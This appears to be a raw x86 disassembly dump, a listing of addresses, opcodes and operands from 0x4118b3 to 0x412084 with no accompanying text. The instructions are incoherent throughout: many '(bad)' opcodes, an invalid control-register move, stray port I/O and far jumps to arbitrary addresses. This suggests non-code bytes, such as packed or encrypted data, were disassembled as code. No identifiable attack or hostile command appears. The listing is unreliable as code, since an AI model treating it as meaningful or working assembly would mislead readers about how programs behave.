  4118b3:	cmp    eax,0x516bb65f
  4118b8:	jmp    0x411916
  4118ba:	pop    esp
  4118bb:	sahf   
  4118bc:	shl    DWORD PTR [eax+ebp*4+0x490b726],0x65
  4118c4:	push   eax
  4118c5:	mov    ebp,0xa50876ed
  4118ca:	mov    ch,0x4b
  4118cc:	pop    esp
  4118cd:	mov    si,0x3562
  4118d1:	mov    ecx,gs
  4118d3:	xor    ebx,0x1d33bfdb
  4118d9:	pop    esi
  4118da:	cmp    ch,bl
  4118dc:	test   BYTE PTR [eax-0x4d],dh
  4118df:	test   BYTE PTR [ebx-0x661ff1bf],0x5a
  4118e6:	(bad)  
  4118e7:	aad    0xf8
  4118e9:	pop    esp
  4118ea:	cmp    ecx,DWORD PTR [edi]
  4118ec:	mov    esp,0x3fa0078c
  4118f1:	mov    gs,WORD PTR [edi-0x1ce8dcd3]
  4118f7:	enter  0x963f,0xea
  4118fb:	jo     0x4118ac
  4118fd:	sbb    DWORD PTR [edi-0x2b86b939],0x9d8ecaf3
  411907:	lock mov esi,0x6a7edefe
  41190d:	push   ds
  41190e:	add    eax,0x98e0e3b9
  411913:	pop    edx
  411914:	cmp    DWORD PTR [esi+eax*4],0xd13ad046
  41191b:	fnstsw WORD PTR [eax+0x5ed6ea4a]
  411921:	retf   
  411922:	fidiv  DWORD PTR [esi+0x16]
  411925:	stos   DWORD PTR es:[edi],eax
  411926:	les    ebp,FWORD PTR [ecx*1+0x16d49b2d]
  41192d:	xlat   BYTE PTR ds:[ebx]
  41192e:	(bad)  
  411930:	je     0x411949
  411932:	ret    0xca76
  411935:	xor    al,0xe6
  411937:	and    BYTE PTR [edi-0xf6d40e0],ch
  41193d:	neg    BYTE PTR [ecx+esi*4-0x13]
  411941:	sbb    DWORD PTR [edx+0x67dab723],0xffffffc6
  411948:	xchg   bh,dh
  41194a:	(bad)  
  41194b:	sub    ebp,esp
  41194d:	mov    ch,dl
  41194f:	push   edi
  411950:	sbb    ch,BYTE PTR [ebp-0x60daaa0e]
  411956:	push   ss
  411957:	test   bh,dl
  411959:	test   DWORD PTR [eax],0xab09f66a
  41195f:	nop
  411960:	dec    ebp
  411961:	retf   
  411962:	outs   dx,BYTE PTR ds:[esi]
  411963:	(bad)  
  411964:	stos   DWORD PTR es:[edi],eax
  411965:	fistp  WORD PTR [edi+0x68d1cad6]
  41196b:	out    dx,al
  41196c:	je     0x411966
  41196e:	lods   eax,DWORD PTR ds:[esi]
  41196f:	fiadd  WORD PTR [edx+0x78]
  411972:	dec    edi
  411973:	test   eax,0x404e7eab
  411978:	fidivr DWORD PTR [ecx]
  41197a:	jnp    0x411979
  41197c:	test   BYTE PTR [ebx],cl
  41197e:	jns    0x41198a
  411980:	push   esi
  411981:	sub    DWORD PTR fs:[eax+0x1d4f2400],0xe3d3a3bf
  41198c:	xchg   edi,eax
  41198d:	push   edx
  41198e:	jecxz  0x4119ea
  411990:	scas   eax,DWORD PTR es:[edi]
  411991:	add    ebx,DWORD PTR [edx-0x13]
  411994:	adc    edx,eax
  411996:	xchg   esp,eax
  411997:	or     edx,DWORD PTR [ecx-0x1c]
  41199a:	adc    cl,dh
  41199c:	lds    esp,FWORD PTR [ebx]
  41199e:	fidiv  DWORD PTR [ebx+ebx*4+0xe]
  4119a2:	cmp    DWORD PTR [ecx],0x79
  4119a5:	test   eax,0x433108d7
  4119aa:	sbb    eax,0x7e6f399
  4119af:	fucompp 
  4119b1:	bound  edx,QWORD PTR [ebx+eax*1]
  4119b4:	imul   ebx,esp,0xf0cb556d
  4119ba:	icebp  
  4119bb:	cmc    
  4119bc:	mov    eax,ds:0x8e770561
  4119c1:	push   edx
  4119c2:	std    
  4119c3:	adc    DWORD PTR [edi],eax
  4119c5:	sbb    DWORD PTR [edi+0x1c],ebp
  4119c8:	int    0xc
  4119ca:	popf   
  4119cb:	sti    
  4119cc:	jecxz  0x4119ea
  4119ce:	jmp    0xcd397088
  4119d3:	inc    eax
  4119d4:	xchg   edi,eax
  4119d5:	add    edx,esp
  4119d7:	leave  
  4119d8:	push   ecx
  4119d9:	cld    
  4119da:	pop    edi
  4119db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119dc:	mov    gs:0xa58ace6b,eax
  4119e2:	or     BYTE PTR [edi-0x49641d82],0x79
  4119e9:	outs   dx,BYTE PTR ds:[esi]
  4119ea:	sahf   
  4119eb:	jecxz  0x411a32
  4119ed:	data16 in al,dx
  4119ef:	repnz sub edi,edi
  4119f2:	test   ebx,edx
  4119f4:	inc    edx
  4119f5:	and    al,dl
  4119f7:	bnd jae 0x411997
  4119fa:	sub    dx,WORD PTR [ecx+edi*8+0x5]
  4119ff:	mov    al,ch
  411a01:	sub    eax,0xa6edcf2e
  411a06:	(bad)  [esi-0x408ff701]
  411a0c:	call   0x442c:0xda61deda
  411a13:	fisubr DWORD PTR [eax-0x1]
  411a16:	push   ecx
  411a17:	mov    dh,0x1f
  411a19:	sub    DWORD PTR [edx],esp
  411a1b:	and    cl,dl
  411a1d:	mov    eax,eax
  411a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a20:	cmp    DWORD PTR [edi],ebp
  411a22:	clc    
  411a23:	inc    esp
  411a24:	mov    cl,0x50
  411a26:	clc    
  411a27:	adc    bh,dh
  411a29:	sub    ah,dl
  411a2b:	jae    0x411a97
  411a2d:	ins    BYTE PTR es:[edi],dx
  411a2e:	cli    
  411a2f:	fucomi st,st(0)
  411a31:	sbb    al,0x6d
  411a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a34:	push   cs
  411a35:	ins    DWORD PTR es:[edi],dx
  411a36:	add    al,0x5a
  411a38:	add    eax,0xe3f6d9e8
  411a3d:	mov    ?,WORD PTR ds:0xc64b7aba
  411a43:	retf   0xdc87
  411a46:	into   
  411a47:	mov    cl,0x6a
  411a49:	push   edx
  411a4a:	repnz pop es
  411a4c:	inc    esp
  411a4d:	outs   dx,BYTE PTR ds:[esi]
  411a4e:	push   ebx
  411a4f:	repnz add ebx,ebx
  411a52:	mov    eax,0x3328c66b
  411a57:	adc    ebx,edi
  411a59:	mov    esp,0xc9aeb782
  411a5e:	dec    ebx
  411a5f:	mov    dh,0x8d
  411a61:	ret    0xe4ff
  411a64:	das    
  411a65:	jne    0x411a2d
  411a67:	out    dx,al
  411a68:	mov    bh,0x2c
  411a6a:	sbb    BYTE PTR [ebx+0x609c43dd],ch
  411a70:	or     DWORD PTR [esi-0x3e5d4edd],esp
  411a76:	xchg   edi,eax
  411a77:	test   al,0xaf
  411a79:	fs push ebx
  411a7b:	dec    ecx
  411a7c:	mov    BYTE PTR [edi+0xc],bl
  411a7f:	pop    ds
  411a80:	fstp   QWORD PTR [ebx+0x56529118]
  411a86:	xchg   ebp,eax
  411a87:	(bad)  
  411a88:	fbstp  TBYTE PTR [esi]
  411a8a:	add    edx,DWORD PTR [edi+eax*8-0x7c0bf86]
  411a91:	mov    ah,0x4b
  411a93:	mov    ebx,0x7e429631
  411a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a99:	fs cli 
  411a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a9c:	es add al,0xdc
  411aa0:	and    ebx,DWORD PTR [esp+ebx*1+0x5b]
  411aa4:	sub    eax,eax
  411aa6:	inc    ecx
  411aa7:	sbb    DWORD PTR [edx+esi*1+0x3a],eax
  411aab:	loopne 0x411ad3
  411aad:	mov    bl,0x50
  411aaf:	stc    
  411ab0:	jns    0x411b13
  411ab2:	adc    ecx,DWORD PTR [eax+0x6a]
  411ab5:	call   0x306a74f8
  411aba:	ins    BYTE PTR es:[edi],dx
  411abb:	out    0x25,al
  411abd:	mov    dh,0xb5
  411abf:	inc    DWORD PTR [ebx-0x22]
  411ac2:	stos   DWORD PTR es:[edi],eax
  411ac3:	add    al,0xfb
  411ac5:	loope  0x411a60
  411ac7:	pushf  
  411ac8:	pusha  
  411ac9:	push   es
  411aca:	push   ebp
  411acb:	mov    esi,0x4c18c456
  411ad0:	mov    dl,BYTE PTR ds:0x90e74a16
  411ad6:	test   eax,0x1b87fb3d
  411adb:	test   BYTE PTR [edx],ah
  411add:	(bad)  
  411ade:	dec    edi
  411adf:	mov    edx,0xe9c2cf14
  411ae4:	or     BYTE PTR ds:0x13b25782,0x44
  411aeb:	push   edi
  411aec:	cld    
  411aed:	fnstsw ax
  411aef:	inc    esi
  411af0:	sub    BYTE PTR [ecx-0x1f],0x46
  411af4:	js     0x411ae5
  411af6:	int    0x59
  411af8:	imul   edi,ebp,0x45003539
  411afe:	dec    esi
  411aff:	sbb    eax,0x8b6ffd99
  411b04:	fidiv  DWORD PTR [ecx+0xc]
  411b07:	adc    al,0xdd
  411b09:	aas    
  411b0a:	aam    0xdd
  411b0c:	sbb    esi,DWORD PTR ds:0xc5f3a545
  411b12:	pushf  
  411b13:	push   DWORD PTR [eax-0x7a]
  411b16:	pop    ecx
  411b17:	int    0x5
  411b19:	pusha  
  411b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b1b:	stos   BYTE PTR es:[edi],al
  411b1c:	dec    ebx
  411b1d:	push   edx
  411b1e:	icebp  
  411b1f:	in     al,dx
  411b20:	sbb    DWORD PTR [ebx+0x28],ebx
  411b23:	xor    BYTE PTR [edi+0x42f88308],ah
  411b29:	pop    gs
  411b2b:	or     BYTE PTR [esi-0x29],cl
  411b2e:	pop    ebp
  411b2f:	sbb    BYTE PTR [edi],dl
  411b31:	and    esi,DWORD PTR [ebx+eiz*1-0x7f3a8549]
  411b38:	or     eax,0x1f8e9b5d
  411b3d:	add    bh,bh
  411b3f:	xchg   edi,eax
  411b40:	push   0x6fa1c8d1
  411b45:	adc    eax,0x138f9413
  411b4a:	imul   ebx,eax,0x33deb0b7
  411b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b51:	mov    DWORD PTR [ecx-0x43],esi
  411b54:	lahf   
  411b55:	jle    0x411b35
  411b57:	mov    edx,0x6bcb37ef
  411b5c:	lock test BYTE PTR [esi+0x3fef6e59],cl
  411b63:	add    esi,DWORD PTR ds:0x8cd63953
  411b69:	xor    ah,BYTE PTR [eax]
  411b6b:	and    al,0x9e
  411b6d:	xor    bl,dh
  411b6f:	lods   eax,DWORD PTR ds:[esi]
  411b70:	xor    ecx,ebx
  411b72:	cli    
  411b73:	loope  0x411bb9
  411b75:	mov    esi,0x2b24e737
  411b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b7b:	inc    edi
  411b7c:	push   ss
  411b7d:	dec    esp
  411b7e:	shr    DWORD PTR [esi+0x59],0x47
  411b82:	xor    eax,0xa521ee99
  411b87:	sahf   
  411b88:	mov    eax,0xe331abed
  411b8d:	and    DWORD PTR ds:[ebx+0x6518e1e9],0x1594bb93
  411b98:	lds    edi,FWORD PTR ds:0x5f1aa355
  411b9e:	scas   eax,DWORD PTR es:[edi]
  411b9f:	fsubrp st(3),st
  411ba1:	pop    es
  411ba2:	and    ebp,DWORD PTR [edi+0x6bd94f2f]
  411ba8:	inc    esi
  411ba9:	ss pop ss
  411bab:	mov    DWORD PTR [ebx-0x39d69068],eax
  411bb1:	mov    esi,0x9c600f8a
  411bb6:	push   ebp
  411bb7:	adc    bh,BYTE PTR [ecx+0x5c]
  411bba:	sub    al,0x82
  411bbc:	inc    ebx
  411bbd:	cld    
  411bbe:	fistp  WORD PTR [esp+eiz*8-0x58d8c6c1]
  411bc5:	ja     0x411bc0
  411bc7:	es cwde 
  411bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bca:	cmp    al,0x2e
  411bcc:	pop    edx
  411bcd:	or     BYTE PTR [esi-0x59],bl
  411bd0:	(bad)  
  411bd1:	pushf  
  411bd2:	push   ds
  411bd3:	cmp    eax,0x9dc7b92a
  411bd8:	dec    ecx
  411bd9:	dec    ebp
  411bda:	aaa    
  411bdb:	and    DWORD PTR [eax-0x63387192],0xc97ff5bd
  411be5:	xor    eax,0xe31bbcf8
  411bea:	fs out 0xab,al
  411bed:	jg     0x411c6e
  411bef:	(bad)  
  411bf0:	in     al,dx
  411bf1:	xchg   edx,eax
  411bf2:	push   es
  411bf3:	shr    BYTE PTR [ebp+eax*4-0x7e6f0286],0x81
  411bfb:	(bad)  
  411bfd:	jmp    0x4576:0x5d705b32
  411c04:	and    esp,DWORD PTR [edx]
  411c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c07:	mov    al,ds:0xd6a1c646
  411c0c:	push   esp
  411c0d:	cmp    eax,0xf973aa8b
  411c12:	lods   al,BYTE PTR ds:[esi]
  411c13:	clc    
  411c14:	stos   BYTE PTR es:[edi],al
  411c15:	out    dx,al
  411c16:	ja     0x411c3e
  411c18:	sub    DWORD PTR [edx],0xc5e3b80a
  411c1e:	cmp    eax,0x896c8584
  411c23:	hlt    
  411c24:	scas   eax,DWORD PTR es:[edi]
  411c25:	dec    ecx
  411c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c27:	adc    BYTE PTR [edx],al
  411c29:	jmp    0xa14d:0xd403acb8
  411c30:	mov    al,ds:0x21e5eb6
  411c35:	ret    
  411c36:	adc    al,0x56
  411c38:	(bad)  
  411c39:	jge    0x411ca9
  411c3b:	cmp    DWORD PTR [ebp+0x41],0x67
  411c3f:	mov    ss,esi
  411c41:	mov    eax,0x698d80b1
  411c46:	adc    BYTE PTR [edx+0x238b83ad],0xea
  411c4d:	imul   edi,DWORD PTR [eiz*2-0x494b6a],0x7c2f5363
  411c58:	rcl    al,1
  411c5a:	stos   BYTE PTR es:[edi],al
  411c5b:	fwait
  411c5c:	shr    DWORD PTR [ecx],0x12
  411c5f:	push   0x88a2cf5
  411c64:	xchg   esp,eax
  411c65:	dec    edx
  411c66:	pop    esi
  411c67:	cmp    ebp,DWORD PTR [edx-0x2d]
  411c6a:	pop    edx
  411c6b:	sbb    edx,eax
  411c6d:	add    bh,BYTE PTR [esi-0x218783fa]
  411c73:	addr16 enter 0xb8e9,0xc2
  411c78:	mov    WORD PTR [edx+ebp*4-0x11],es
  411c7c:	mov    ebp,DWORD PTR [ecx-0x27190acb]
  411c82:	nop
  411c83:	call   0x6c85cb0
  411c88:	push   ss
  411c89:	pop    eax
  411c8a:	dec    edx
  411c8b:	cwde   
  411c8c:	sub    al,0xe5
  411c8e:	(bad)  
  411c8f:	shl    BYTE PTR [ecx+ecx*8+0x7f],1
  411c93:	inc    ebp
  411c94:	int    0x60
  411c96:	popf   
  411c97:	(bad)  
  411c98:	clc    
  411c99:	sub    dl,0xde
  411c9c:	fisttp WORD PTR [ebx-0x40f47b21]
  411ca2:	mov    bh,0xed
  411ca4:	imul   ebp,DWORD PTR [edi-0x22],0x8418cd3f
  411cab:	fsub   DWORD PTR [ebp+eax*8+0x448ddda0]
  411cb2:	pop    edx
  411cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb4:	out    0xbd,al
  411cb6:	cmp    eax,0x4d2e1292
  411cbb:	pusha  
  411cbc:	add    BYTE PTR [edx],dh
  411cbe:	js     0x411c4c
  411cc0:	sub    ecx,DWORD PTR [ebx-0x4decaf]
  411cc6:	retf   0xa67d
  411cc9:	test   al,0xcc
  411ccb:	jmp    edx
  411ccd:	and    eax,0xe18dfe49
  411cd2:	or     dh,al
  411cd4:	data16 sbb BYTE PTR [esi+ebx*4+0x77],0x98
  411cda:	xchg   ebx,eax
  411cdb:	outs   dx,BYTE PTR ds:[esi]
  411cdc:	pop    ss
  411cdd:	mov    edi,0x5b26a09c
  411ce2:	mov    DWORD PTR [ebx-0x7e],ebp
  411ce5:	pop    esp
  411ce6:	xor    DWORD PTR ds:0xe7ad53ec,esi
  411cec:	in     al,dx
  411ced:	les    esp,FWORD PTR [ecx+0x12]
  411cf0:	xchg   ecx,eax
  411cf1:	mov    WORD PTR [esp],cs
  411cf4:	mov    ds:0x86c20c40,eax
  411cf9:	jne    0x411caf
  411cfb:	xchg   edi,eax
  411cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cfd:	fs jle 0x411cc6
  411d00:	out    0x92,al
  411d02:	cli    
  411d03:	cs retf 
  411d05:	mov    dl,0xba
  411d07:	dec    edx
  411d08:	pop    ebx
  411d09:	pusha  
  411d0a:	cmp    edi,DWORD PTR [edi+0xd0b088a]
  411d10:	aad    0x6d
  411d12:	cdq    
  411d13:	stos   BYTE PTR es:[edi],al
  411d14:	xor    edx,DWORD PTR [ebx-0x5e9c2f08]
  411d1a:	cld    
  411d1b:	cmp    cl,cl
  411d1d:	inc    ebp
  411d1e:	mov    dh,0x79
  411d20:	into   
  411d21:	cmp    eax,0x1c8539a7
  411d26:	(bad)  
  411d27:	fist   WORD PTR [ebp+edx*1+0x3802cac]
  411d2e:	shl    BYTE PTR [esi+0x3c],cl
  411d31:	add    eax,0xaf23885b
  411d36:	sub    DWORD PTR [edx+0x7f],edx
  411d39:	push   0x5e819bc7
  411d3e:	popa   
  411d3f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  411d41:	push   ss
  411d42:	mov    esi,0x8eb42fb6
  411d47:	jmp    0xc1af732f
  411d4c:	dec    esp
  411d4d:	sub    ebx,eax
  411d4f:	jb     0x411dab
  411d51:	push   esp
  411d52:	sbb    dh,BYTE PTR [esi-0x29dda698]
  411d58:	in     eax,dx
  411d59:	dec    edi
  411d5a:	sub    al,0xaa
  411d5c:	js     0x411d28
  411d5e:	out    0xdb,eax
  411d60:	inc    edi
  411d61:	adc    ah,dh
  411d63:	cmp    al,0x53
  411d65:	les    edi,FWORD PTR [edi-0x2a]
  411d68:	sbb    esi,ecx
  411d6a:	jge    0x411dc8
  411d6c:	mov    ebx,0x4b701f1d
  411d71:	add    al,BYTE PTR [ebp+0x62]
  411d74:	pop    ebp
  411d75:	cmp    BYTE PTR [esi],ch
  411d77:	mov    WORD PTR [ebx],ds
  411d79:	xchg   esp,eax
  411d7a:	xor    edi,DWORD PTR [edx+0x25]
  411d7d:	cmp    BYTE PTR [eax+0x1518dbc5],0x90
  411d84:	cmp    DWORD PTR [ebx+0x4083580e],edx
  411d8a:	push   ebp
  411d8b:	mov    dl,BYTE PTR [eax+0x39ad2d9b]
  411d91:	stos   DWORD PTR es:[edi],eax
  411d92:	scas   eax,DWORD PTR es:[edi]
  411d93:	and    dl,dl
  411d95:	xchg   ebx,eax
  411d96:	popf   
  411d97:	mov    es,WORD PTR [ebx+ebx*2]
  411d9a:	push   ebp
  411d9b:	push   ss
  411d9c:	push   ebx
  411d9d:	add    al,0x9
  411d9f:	daa    
  411da0:	cmp    DWORD PTR [ebp+0x21],edx
  411da3:	jle    0x411e13
  411da5:	ret    
  411da6:	rcl    DWORD PTR [edx+0x4f5f7003],cl
  411dac:	or     DWORD PTR [esi],0x152cc0d0
  411db2:	sub    edx,ebx
  411db4:	xor    ah,ch
  411db6:	ret    0xd9d5
  411db9:	add    edi,DWORD PTR [ebp+0xd]
  411dbc:	addr16 mov edx,0x686617b6
  411dc2:	xor    BYTE PTR [ebx+0x291edcb],dl
  411dc8:	cmp    edx,DWORD PTR [ebx+esi*4+0x7be8507f]
  411dcf:	adc    BYTE PTR [edi],al
  411dd1:	test   al,0x78
  411dd3:	imul   ebp,DWORD PTR [eax+0x4],0xffffff94
  411dd7:	int    0xb2
  411dd9:	mov    esp,0xb2acb85e
  411dde:	sbb    al,0x0
  411de0:	mov    esp,0x63307a67
  411de5:	test   DWORD PTR [ecx-0x11],edx
  411de8:	dec    esi
  411de9:	and    BYTE PTR [ecx+0x15bec9e7],cl
  411def:	(bad)  
  411df0:	sub    eax,0x225713d6
  411df5:	fdivr  DWORD PTR [ecx+0x5837057d]
  411dfb:	aam    0xed
  411dfd:	sub    DWORD PTR [edx-0x59c63490],edi
  411e03:	xchg   DWORD PTR [esi+0x2dbceefd],edx
  411e09:	jbe    0x411ddb
  411e0b:	loopne 0x411df5
  411e0d:	and    al,0xd0
  411e0f:	repnz popf 
  411e11:	in     eax,0xbd
  411e13:	sahf   
  411e14:	iret   
  411e15:	es fst st(3)
  411e18:	popf   
  411e19:	(bad)  
  411e1a:	jmp    0x9ac314ef
  411e1f:	fild   QWORD PTR [esi+0x7b]
  411e22:	dec    ecx
  411e23:	fxch   st(6)
  411e25:	add    cl,dl
  411e27:	into   
  411e28:	scas   eax,DWORD PTR es:[edi]
  411e29:	outs   dx,DWORD PTR ds:[esi]
  411e2a:	cmp    al,BYTE PTR ds:0x5230d38
  411e30:	cmp    dh,BYTE PTR [edx]
  411e32:	stos   DWORD PTR es:[edi],eax
  411e33:	mov    bl,0x2b
  411e35:	pop    esi
  411e36:	or     edx,DWORD PTR [esi+edx*8-0x6553bafd]
  411e3d:	jmp    DWORD PTR [edi]
  411e3f:	jnp    0x411de6
  411e41:	(bad)  
  411e42:	fist   WORD PTR [eax-0x24]
  411e45:	or     ecx,DWORD PTR [esi+eax*8]
  411e48:	dec    ecx
  411e49:	leave  
  411e4a:	leave  
  411e4b:	adc    ecx,esp
  411e4d:	scas   eax,DWORD PTR es:[edi]
  411e4e:	leave  
  411e4f:	js     0x411e9a
  411e51:	or     esp,edx
  411e53:	cmp    al,0x55
  411e55:	push   edi
  411e56:	mov    edi,0x7df4a7ad
  411e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e5c:	mov    ah,0x41
  411e5e:	mov    cl,BYTE PTR [edx+edx*8+0x26b84aba]
  411e65:	xor    ebx,eax
  411e67:	iret   
  411e68:	outs   dx,BYTE PTR ds:[esi]
  411e69:	xadd   ecx,eax
  411e6c:	mov    edx,0x1d0004ce
  411e71:	cmp    BYTE PTR [eax+0x39],0x9
  411e75:	pop    edx
  411e76:	cli    
  411e77:	fs pop ecx
  411e79:	inc    ecx
  411e7a:	jae    0x411e1b
  411e7c:	addr16 push ss
  411e7e:	out    dx,al
  411e7f:	mov    al,0x99
  411e81:	inc    edx
  411e82:	cli    
  411e83:	mov    ebp,0x7f2d75f7
  411e88:	ja     0x411e94
  411e8a:	inc    eax
  411e8b:	xor    ecx,DWORD PTR [eax+0x25]
  411e8e:	fwait
  411e8f:	mov    ebx,0x387d93d
  411e94:	mov    bh,0x8
  411e96:	push   ebx
  411e97:	frstor [ebp-0x5b9f453]
  411e9d:	(bad)  
  411e9e:	retf   
  411e9f:	in     eax,0x65
  411ea1:	mov    edi,DWORD PTR [eax+0xacfc59c]
  411ea7:	(bad)  [esi-0x128d40fd]
  411ead:	xchg   edi,eax
  411eae:	(bad)  
  411eaf:	in     al,dx
  411eb0:	or     ecx,ebp
  411eb2:	add    BYTE PTR [edi-0x11],dh
  411eb5:	fs ret 
  411eb7:	jmp    0x8225c512
  411ebc:	(bad)  
  411ebe:	enter  0x1225,0x2c
  411ec2:	mov    ch,0x23
  411ec4:	xchg   esp,eax
  411ec5:	xchg   ebx,eax
  411ec6:	mov    ds:0xaf6a612b,al
  411ecb:	fadd   st(5),st
  411ecd:	sub    al,0x4d
  411ecf:	inc    edi
  411ed0:	adc    BYTE PTR [ebx-0x46b5737],bh
  411ed6:	push   ebx
  411ed7:	pusha  
  411ed8:	sbb    al,BYTE PTR [ebx+0x4970c264]
  411ede:	es cmp al,0x2c
  411ee1:	mov    ds:0x3e5847b6,eax
  411ee6:	pop    edi
  411ee7:	arpl   WORD PTR [edi-0xe456d7f],cx
  411eed:	test   eax,0xe08e91c0
  411ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ef3:	pop    ds
  411ef4:	and    eax,0xbd8b786a
  411ef9:	(bad)  
  411efa:	icebp  
  411efb:	inc    esp
  411efc:	mov    BYTE PTR [edi+0x4e],al
  411eff:	mov    al,ds:0xece61d34
  411f04:	pop    ecx
  411f05:	mov    esi,0x5052b3af
  411f0a:	push   esi
  411f0b:	lea    ebx,[esi+0x43]
  411f0e:	xchg   ebx,eax
  411f0f:	ror    BYTE PTR [ebp+0x79],1
  411f12:	push   cs
  411f13:	mov    edi,0xf0993f7a
  411f18:	inc    eax
  411f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f1a:	dec    ecx
  411f1b:	add    eax,0x16530543
  411f20:	and    al,0xb2
  411f22:	push   edi
  411f23:	fdivr  st,st(6)
  411f25:	std    
  411f26:	mov    eax,cr1
  411f29:	inc    esi
  411f2a:	pushf  
  411f2b:	cmp    al,0x80
  411f2d:	adc    bl,dl
  411f2f:	leave  
  411f30:	sub    al,0xde
  411f32:	xchg   BYTE PTR [esi+0x37],al
  411f35:	xchg   edx,eax
  411f36:	(bad)  [esi+0x5]
  411f39:	jecxz  0x411f54
  411f3b:	adc    eax,0xc40c3c3a
  411f40:	xchg   ebp,eax
  411f41:	rcr    ebx,cl
  411f43:	mov    eax,0xbdf94fed
  411f48:	mov    ecx,0x3e7e3481
  411f4d:	cmp    eax,0xaf7510eb
  411f52:	mov    ebx,0x6e9ad545
  411f57:	jb     0x411f6e
  411f59:	pop    ds
  411f5a:	ror    ebp,1
  411f5c:	leave  
  411f5d:	and    DWORD PTR [ebx*8+0xd64da4f],edx
  411f64:	xchg   edi,eax
  411f65:	dec    edi
  411f66:	or     eax,0x635ff369
  411f6b:	ja     0x411f0a
  411f6d:	add    ch,dl
  411f6f:	imul   BYTE PTR [esi-0x50c93367]
  411f75:	adc    eax,0xf23addda
  411f7a:	xor    eax,0x40456e62
  411f7f:	inc    esi
  411f80:	shr    ebx,0x24
  411f83:	(bad)  
  411f85:	push   0x1f9ba3ad
  411f8a:	lods   al,BYTE PTR ds:[esi]
  411f8b:	sub    DWORD PTR [ecx],0xffffffe4
  411f8e:	sahf   
  411f8f:	aas    
  411f90:	xor    edi,DWORD PTR [esp+ecx*2+0x37]
  411f94:	dec    ecx
  411f95:	inc    ebx
  411f96:	dec    ebp
  411f97:	xor    eax,0xf563d6be
  411f9c:	xor    dh,BYTE PTR [eax]
  411f9e:	xchg   ebp,eax
  411f9f:	dec    ebp
  411fa0:	sbb    bh,al
  411fa2:	fstp   QWORD PTR [esi]
  411fa4:	pop    ecx
  411fa5:	in     eax,dx
  411fa6:	sub    DWORD PTR [edx+0x22],ebx
  411fa9:	xlat   BYTE PTR ds:[ebx]
  411faa:	jecxz  0x411f3c
  411fac:	out    dx,eax
  411fad:	dec    esp
  411fae:	clc    
  411faf:	pop    ecx
  411fb0:	outs   dx,BYTE PTR ds:[esi]
  411fb1:	dec    eax
  411fb2:	in     al,0xf0
  411fb4:	add    esp,0x4b
  411fb7:	cmp    al,0xfd
  411fb9:	sbb    esi,DWORD PTR [edi]
  411fbb:	pop    ds
  411fbc:	jp     0x411f48
  411fbe:	xor    BYTE PTR [esi+edx*8+0x4d86be4],dh
  411fc5:	jp     0x411ff8
  411fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc8:	and    DWORD PTR [esi],edi
  411fca:	sub    eax,0xddca5b48
  411fcf:	xor    eax,0x4ec09855
  411fd4:	sub    DWORD PTR [eax],esp
  411fd6:	or     edx,DWORD PTR [esi+edx*1]
  411fd9:	adc    al,0xd0
  411fdb:	adc    BYTE PTR [ecx-0x52],dl
  411fde:	aad    0x6a
  411fe0:	lods   eax,DWORD PTR ds:[esi]
  411fe1:	sub    eax,0xe6539e00
  411fe6:	daa    
  411fe7:	jns    0x411fe8
  411fe9:	xor    esp,DWORD PTR [ecx]
  411feb:	push   esp
  411fec:	push   0xffffffd7
  411fee:	mov    ch,0xed
  411ff0:	inc    ebx
  411ff1:	push   edx
  411ff2:	jle    0x412008
  411ff4:	sub    BYTE PTR [edx+0x12],0x4f
  411ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff9:	xchg   edx,eax
  411ffa:	test   BYTE PTR [ebp-0x5c476590],0x51
  412001:	les    edi,FWORD PTR [ecx+0x5c]
  412004:	jg     0x412008
  412006:	fld    DWORD PTR [esi-0x24f9055e]
  41200c:	xchg   esp,eax
  41200d:	in     eax,dx
  41200e:	jnp    0x41208a
  412010:	hlt    
  412011:	pusha  
  412012:	push   ebx
  412013:	jnp    0x41200e
  412015:	pop    ebx
  412016:	std    
  412017:	inc    ebp
  412018:	xchg   esp,eax
  412019:	retf   0x2d72
  41201c:	add    ebp,DWORD PTR ds:0xc986aa8
  412022:	fs cld 
  412024:	jecxz  0x412032
  412026:	popf   
  412027:	data16 mov bh,0x50
  41202a:	lea    esp,[ebx]
  41202c:	mov    eax,0xc7d7b4c0
  412031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412032:	mov    ah,0x9a
  412034:	sub    BYTE PTR [ecx+0x26],bh
  412037:	push   edi
  412038:	fist   DWORD PTR [edx+0x34919d96]
  41203e:	rol    al,0xe5
  412041:	mov    BYTE PTR [ecx+0x7b],bl
  412044:	nop
  412045:	fadd   st(6),st
  412047:	fimul  WORD PTR [eax+0x52]
  41204a:	aas    
  41204b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41204c:	and    cl,0x2c
  41204f:	pop    ebx
  412050:	jb     0x4120af
  412052:	mov    ebx,0xd5a3c776
  412057:	xchg   esi,eax
  412058:	mov    eax,ds:0x8233b8b4
  41205d:	jmp    0x412094
  41205f:	iret   
  412060:	or     BYTE PTR [eax+edi*2],al
  412063:	shr    BYTE PTR [ecx],cl
  412065:	ror    edi,cl
  412067:	mov    edi,0xd29bc91e
  41206c:	nop    DWORD PTR ds:0xc92dcf24
  412073:	rcl    BYTE PTR [esi],0x69
  412076:	repnz out 0x4f,al
  412079:	and    eax,0xee35625e
  41207e:	clc    
  41207f:	mov    edi,0x7181e11b
  412084:	cmp    DWORD PTR [edi-0x5],esi
